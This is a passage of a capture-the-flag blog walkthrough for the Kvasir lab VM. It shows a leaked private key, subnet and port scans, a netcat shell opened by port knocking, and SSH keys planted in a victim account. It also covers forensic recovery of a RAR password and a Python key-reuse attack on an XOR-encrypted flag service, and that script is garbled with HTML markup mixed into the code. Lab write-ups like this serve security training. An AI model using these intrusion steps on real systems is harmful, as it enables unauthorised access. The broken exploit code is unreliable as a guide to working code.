+DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D
+
+OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
+So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
+Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
+J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
+P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
+jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
+9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
+hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
+Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
+oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
+0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
+q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
+cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
+X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
+MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
+gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
+N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
+izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
+Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
+uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
+PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
+RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
+4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
+DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
+JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<p>Awesome, let&rsquo;s use this to connect in as <code>terra</code>.</p>
+
+<pre><code>root@db:~# ssh terra@192.168.3.50 -i terra.id
+Enter passphrase for key 'terra.id':
+</code></pre>
+
+<p>Passphrase? Let&rsquo;s try <code>Nk9yY31hva8q</code> from the QR code.</p>
+
+<pre><code>root@db:~# ssh terra@192.168.3.50 -i terra.id
+Enter passphrase for key 'terra.id': 
+Linux dev2 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+Last login: Tue Nov  4 17:51:12 2014 from 192.168.3.200
+terra@dev2:~$
+</code></pre>
+
+<p>Aaaand we&rsquo;re in!</p>
+
+<h2>Port knocking </h2>
+
+<p>First thing you notice, there&rsquo;s some mail to read. Let&rsquo;s disregard privacy and see what&rsquo;s in there.</p>
+
+<pre><code>terra@dev2:~$ cat /var/mail/terra 
+Return-path: &lt;locke@192.168.4.100&gt;
+Received: from locke by 192.168.4.100 with local (Exim 4.80)
+~       (envelope-from &lt;locke@adm&gt;)
+~       id 1XHczw-0000V2-8y
+~       for terra@192.168.3.50; Wed, 13 Aug 2014 19:10:08 +0100
+
+Date: Wed, 13 Aug 2014 19:10:08 +0100
+To: terra@192.168.3.50
+Subject: Port Knock
+User-Agent: Heirloom mailx 12.5 6/20/10
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Message-Id: &lt;E1XHczw-0000V2-8y@adm&gt;
+From: locke@192.168.4.100
+~
+Hi Terra,
+
+I've been playing with a port knocking daemon on my PC - see if you can use that to get a shell.
+Let me know how it goes.
+
+Regards,
+Locke
+</code></pre>
+
+<p>Okay, looks like port knocking is enabled on <code>locke</code>. But, what&rsquo;s the sequence, what&rsquo;s <code>locke</code>&rsquo;s IP address and what other ports are open?</p>
+
+<p>We can see that <code>terra</code> is dual-homed, so most likely, <code>locke</code> is going to be in 192.168.4.0 subnet.</p>
+
+<pre><code>terra@dev2:~$ /sbin/ifconfig
+eth0      Link encap:Ethernet  HWaddr 16:90:14:17:19:17  
+          inet addr:192.168.3.50  Bcast:192.168.3.255  Mask:255.255.255.0
+          inet6 addr: fe80::1490:14ff:fe17:1917/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:149577 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:162327 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:11573196 (11.0 MiB)  TX bytes:17903327 (17.0 MiB)
+
+eth1      Link encap:Ethernet  HWaddr da:9e:bf:d1:a2:e6  
+          inet addr:192.168.4.50  Bcast:192.168.4.255  Mask:255.255.255.0
+          inet6 addr: fe80::d89e:bfff:fed1:a2e6/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:126211 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:97379 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:18689553 (17.8 MiB)  TX bytes:7391653 (7.0 MiB)
+
+(...)
+</code></pre>
+
+<p>First, let&rsquo;s use my homemade scanner to see what IP addresses are in the range.</p>
+
+<pre><code>terra@dev2:~$ for i in {1..254}; do ping -c 1 -w 1 192.168.4.$i | grep "1 received" -B 1; done
+^C
+--- 192.168.4.50 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+--- 192.168.4.100 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+^C
+</code></pre>
+
+<p>Looks like 192.168.4.100 is the one we should be interested in. Let&rsquo;s see what ports are opened.</p>
+
+<pre><code>terra@dev2:~$ for i in {1..65535}; do nc -z 192.168.4.100 $i; if [ $? -eq 0 ]; then echo "Port $i listening" &gt;&gt; results; fi; done
+terra@dev2:~$ cat results 
+Port 22 listening
+</code></pre>
+
+<p>Okay&hellip; port 22 opened, but we don&rsquo;t have a password/key&hellip; maybe port knocking will open more ports? But what&rsquo;s the sequence? Let&rsquo;s try some defaults - maybe 7000, 8000, 9000 (<a href="http://www.zeroflux.org/projects/knock/">knockd</a> defaults).</p>
+
+<pre><code>terra@dev2:~$ nc 192.168.4.100 7000
+(UNKNOWN) [192.168.4.100] 7000 (afs3-fileserver) : Connection refused
+terra@dev2:~$ nc 192.168.4.100 8000
+(UNKNOWN) [192.168.4.100] 8000 (?) : Connection refused
+terra@dev2:~$ nc 192.168.4.100 9000
+(UNKNOWN) [192.168.4.100] 9000 (?) : Connection refused
+terra@dev2:~$ for i in {1..65535}; do nc -z 192.168.4.100 $i; if [ $? -eq 0 ]; then echo "Port $i listening" &gt;&gt; results; fi; done
+terra@dev2:~$ cat results 
+Port 22 listening
+Port 1111 listening
+</code></pre>
+
+<p>Ha, awesome! Default sequence seemed to work, now we have another port opened. Let&rsquo;s connect to it.</p>
+
+<pre><code>terra@dev2:~$ nc 192.168.4.100 1111
+whoami
+locke
+</code></pre>
+
+<p>Shell!!!! Quickly generated new keys and dropped them under locke&rsquo;s <code>.ssh</code> dir. Let&rsquo;s connect via normal SSH.</p>
+
+<pre><code>terra@dev2:~$ ssh locke@192.168.4.100 -i keys/locke.id
+Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Nov  4 17:51:13 2014 from 192.168.4.50
+locke@adm:~$
+</code></pre>
+
+<h2>A little bit of forensics</h2>
+
+<p>After some poking around, we can see that this server is not dual-homed (finally!), so I think this could be our final machine!</p>
+
+<p>Also, there&rsquo;s another user - <code>kefka</code>, I guess that&rsquo;s the one we&rsquo;ll need to get our privilege escalation from. But first, we need to get access to that account.</p>
+
+<p>First thing that stands out is <code>note.txt</code> file and <code>diskimage.tar.gz</code>.</p>
+
+<pre><code>locke@adm:~$ cat note.txt 
+Looks like Kefka may have been abusing our removable media policy.  I've extracted this image to have a look.
+</code></pre>
+
+<p>Cool, let&rsquo;s get diskimage file, extract it and see what it&rsquo;s all about (again, <code>scp</code> it all the way back to our Kali).</p>
+
+<pre><code>root@kali:~# file diskimage 
+diskimage: x86 boot sector, code offset 0x3c, OEM-ID "MSDOS5.0", sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes &gt; 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit)
+root@kali:~# mount diskimage /mnt
+root@kali:~# cd /mnt/
+root@kali:/mnt# ls
+total 21
+drwxr-xr-x  2 root root 16384 Jan  1  1970 .
+drwxr-xr-x 22 root root  4096 Oct 12 12:26 ..
+-rwxr-xr-x  1 root root   118 Aug  3 11:10 Secret.rar
+root@kali:/mnt# unrar x Secret.rar 
+
+UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal
+
+
+Extracting from Secret.rar
+
+Enter password (will not be echoed) for MyPassword.txt: 
+
+Extracting  MyPassword.txt                                            44%
+CRC failed in the encrypted file MyPassword.txt. Corrupt file or wrong password.
+Total errors: 1
+</code></pre>
+
+<p>So I&rsquo;ve mounted the image, but can only see one file that is encrypted! And again, I don&rsquo;t have a password. Ahhh, did I miss something on the way? What made me suspicious though was the size of the diskimage file, it&rsquo;s like 60MB, while <code>Secret.rar</code> is merely a hundred bytes. There must be something else!</p>
+
+<p>I reached out to a simple, extremely useful tool for extracting data from images - <code>foremost</code>. It&rsquo;ll extract all the files it can find (even deleted ones) from a provided image. Let&rsquo;s have a look what we can get here.</p>
+
+<pre><code>root@kali:~# foremost -i diskimage 
+Processing: diskimage
+|*|
+root@kali:~# cd output/
+root@kali:~/output# ls
+total 20
+drwxr-xr--  4 root root 4096 Nov  6 11:50 .
+drwxr-xr-x 27 root root 4096 Nov  6 11:50 ..
+-rw-r--r--  1 root root  729 Nov  6 11:50 audit.txt
+drwxr-xr--  2 root root 4096 Nov  6 11:50 rar
+drwxr-xr--  2 root root 4096 Nov  6 11:50 wav
+root@kali:~/output# cd wav/
+root@kali:~/output/wav# ls
+total 440
+drwxr-xr-- 2 root root   4096 Nov  6 11:50 .
+drwxr-xr-- 4 root root   4096 Nov  6 11:50 ..
+-rw-r--r-- 1 root root 440480 Nov  6 11:50 00000514.wav
+</code></pre>
+
+<p>Cool, we found a wav file!</p>
+
+<p>Unfortunately, it doesn&rsquo;t sound like anything useful at all&hellip; <code>strings</code> didn&rsquo;t return anything useful on it either. I did a bit of a research into hiding data in wav files, but there is variety of different tools and yet no hints about which one may have been used. But then got that idea&hellip; let&rsquo;s see &ldquo;how does the sound look like&rdquo;.</p>
+
+<p>I&rsquo;ve downloaded <a href="http://www.sonicvisualiser.org/index.html">SonicVisualiser</a> and opened up spectogram of the wav file.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/spectogram.png" title="Spectogram" alt="Spectogram" /></p>
+
+<p>Whoop, whoop! That&rsquo;s our password to the rar!</p>
+
+<pre><code>root@kali:~/output/rar# unrar x 00000512.rar 
+
+UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal
+
+
+Extracting from 00000512.rar
+
+Enter password (will not be echoed) for MyPassword.txt: 
+
+Extracting  MyPassword.txt                                            OK 
+All OK
+root@kali:~/output/rar# cat MyPassword.txt 
+5224XbG5ki2C
+</code></pre>
+
+<h2>Key reuse</h2>
+
+<p>Using found password <code>5224XbG5ki2C</code> we can log-in as <code>kefka</code>.</p>
+
+<pre><code>locke@adm:~$ su - kefka
+Password: 
+kefka@adm:~$ sudo -l
+Matching Defaults entries for kefka on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User kefka may run the following commands on this host:
+    (ALL) NOPASSWD: /opt/wep2.py
+</code></pre>
+
+<p>And quickly see that we&rsquo;ll need to do our privilege escalation via <code>/opt/wep2.py</code> script.</p>
+
+<p>So what does it actually do? It opens up local port 1234 and listens for connections. When you connect to it, it offers to provide you an encrypted flag and also encrypts input of your choice.</p>
+
+<pre><code>kefka@adm:~$ sudo /opt/wep2.py &amp;
+[1] 2817
+kefka@adm:~$ nc localhost 1234
+=============================
+Can you retrieve my secret..?
+=============================
+
+Usage:
+'V' to view the encrypted flag
+'E' to encrypt a plaintext string (e.g. 'E AAAA')
+
+V
+1e6115:09f6e8ef07010490172cdbb2
+V
+a54afe:9c82be3f9bdecf8e426c91d8
+V
+4c1261:57630397f8dbad94c02c0a45
+E A
+853283:cd
+E A
+acfd3c:93
+</code></pre>
+
+<p>Quickly we can observe couple things:</p>
+
+<ul>
+<li>encrypted text is always different</li>
+<li>different keys are used each time (hence the above)</li>
+<li>output strings are hex representations of encoded string</li>
+<li>used key is pretty small</li>
+</ul>
+
+
+<p>Also, name of the script suggests WEP encryption&hellip; or at least that it&rsquo;s as bad as WEP :)</p>
+
+<p>After a bit of research, we can craft our attack using key reuse. Few words on how it works.</p>
+
+<p>Because of the way XOR works, some weak ciphers are vunerable to key reuse attack if the same key is reused. As long as you know the plaintext of one encrypted message and it&rsquo;s key, if you find another, unknown message encoded with the same key, you will be able to extract its plaintext. Let&rsquo;s look at the following:</p>
+
+<p> <code>encrypted_messageA</code> = <code>messageA</code> XOR <code>key</code></p>
+
+<p> <code>encrypted_messageB</code> = <code>messageB</code> XOR <code>key</code></p>
+
+<p>What happens if we XOR both of them together? Remember that <code>abc XOR abc = 0</code>!</p>
+
+<p> <code>encrypted_messageA XOR encrypted_messageB = messageA XOR key XOR messageB XOR key = messageA XOR messageB</code></p>
+
+<p>Keys disappeared, because <code>key XOR key = 0</code>.</p>
+
+<p>Now assume we know plaintext of <code>messageA</code> and want to find <code>messageB</code>. All we need to do is get rid of known <code>messageA</code> from the equation by XORing the whole thing with <code>messageA</code>.</p>
+
+<p> <code>messageA XOR messageB XOR messageA = messageB</code></p>
+
+<p>Again, because <code>messageA XOR messageA = 0</code>.</p>
+
+<p><em>Some really good resources that helped me with understanding the concept:</em></p>
+
+<ul>
+<li><a href="http://b.cryptosmith.com/2008/05/31/stream-reuse/">http://b.cryptosmith.com/2008/05/31/stream-reuse/</a></li>
+<li><a href="http://en.wikipedia.org/wiki/Stream_cipher_attack">http://en.wikipedia.org/wiki/Stream_cipher_attack</a></li>
+</ul>
+
+
+<p>So, knowing what needs to be done, I&rsquo;ve crafted below script to quickly get our plaintext flag.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">socket</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">XOR</span> <span class="n">strings</span> <span class="n">function</span> <span class="n">definition</span> <span class="p">(</span><span class="n">ensure</span> <span class="n">to</span> <span class="k">pass</span> <span class="ow">in</span> <span class="n">binary</span> <span class="n">values</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">xor_strings</span><span class="p">(</span><span class="n">p_string1</span><span class="p">,</span> <span class="n">p_string2</span><span class="p">):</span>
+</span><span class='line'>    <span class="k">return</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">y</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">p_string1</span><span class="p">,</span> <span class="n">p_string2</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Initialise</span> <span class="n">socket</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mi">1234</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Get</span> <span class="n">banner</span> <span class="ow">and</span> <span class="n">instructions</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Random</span><span class="p">,</span> <span class="n">known</span> <span class="n">message</span> <span class="n">of</span> <span class="n">the</span> <span class="n">same</span> <span class="n">length</span> <span class="k">as</span> <span class="n">the</span> <span class="n">flag</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">to</span> <span class="n">be</span> <span class="n">used</span> <span class="n">later</span> <span class="k">for</span> <span class="n">XOR</span> <span class="n">operations</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">message</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="mi">12</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Collections</span> <span class="n">of</span> <span class="n">encrypted</span> <span class="n">flags</span> <span class="ow">and</span> <span class="n">messages</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">flags</span> <span class="o">=</span> <span class="p">{}</span>
+</span><span class='line'><span class="n">messages</span> <span class="o">=</span> <span class="p">{}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'>    <span class="c"># Build a list of known encrypted flags</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
+</span><span class='line'>    <span class="n">encrypted_flag</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">flag_key</span> <span class="o">=</span> <span class="n">encrypted_flag</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
+</span><span class='line'>    <span class="n">flag_value</span> <span class="o">=</span> <span class="n">encrypted_flag</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>
+</span><span class='line'>    <span class="n">flags</span><span class="p">[</span><span class="n">flag_key</span><span class="p">]</span> <span class="o">=</span> <span class="n">flag_value</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c"># Build a list of known encrypted messages</span>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;E &quot;</span> <span class="o">+</span> <span class="n">message</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">encrypted_message</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span class='line'><span class="n">message_key</span> <span class="o">=</span> <span class="n">encrypted_message</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
+</span><span class='line'><span class="n">message_value</span> <span class="o">=</span> <span class="n">encrypted_message</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>
+</span><span class='line'><span class="n">messages</span><span class="p">[</span><span class="n">message_key</span><span class="p">]</span> <span class="o">=</span> <span class="n">message_value</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Find the flag key in message keys or vice versa</span>
+</span><span class='line'><span class="c"># (since we&#39;re building 2 lists, check both - should</span>
+</span><span class='line'><span class="c"># be able to find a match quicker)</span>
+</span><span class='line'><span class="k">if</span> <span class="n">flag_key</span> <span class="ow">in</span> <span class="n">messages</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">message_value</span> <span class="o">=</span> <span class="n">messages</span><span class="p">[</span><span class="n">flag_key</span><span class="p">]</span>
+</span><span class='line'>    <span class="k">break</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="n">message_key</span> <span class="ow">in</span> <span class="n">flags</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">flag_value</span> <span class="o">=</span> <span class="n">flags</span><span class="p">[</span><span class="n">message_key</span><span class="p">]</span>
+</span><span class='line'>    <span class="k">break</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Values</span> <span class="n">are</span> <span class="n">returned</span> <span class="ow">in</span> <span class="nb">hex</span> <span class="n">form</span><span class="p">,</span> <span class="n">so</span> <span class="n">need</span> <span class="n">to</span> <span class="n">convert</span> <span class="n">it</span> <span class="n">back</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">to</span> <span class="n">binary</span> <span class="k">for</span> <span class="n">XOR</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">binary_message</span> <span class="o">=</span> <span class="n">message_value</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nb">hex</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
+</span><span class='line'><span class="n">binary_flag</span> <span class="o">=</span> <span class="n">flag_value</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nb">hex</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">XOR</span> <span class="n">both</span> <span class="n">encryptions</span> <span class="n">together</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
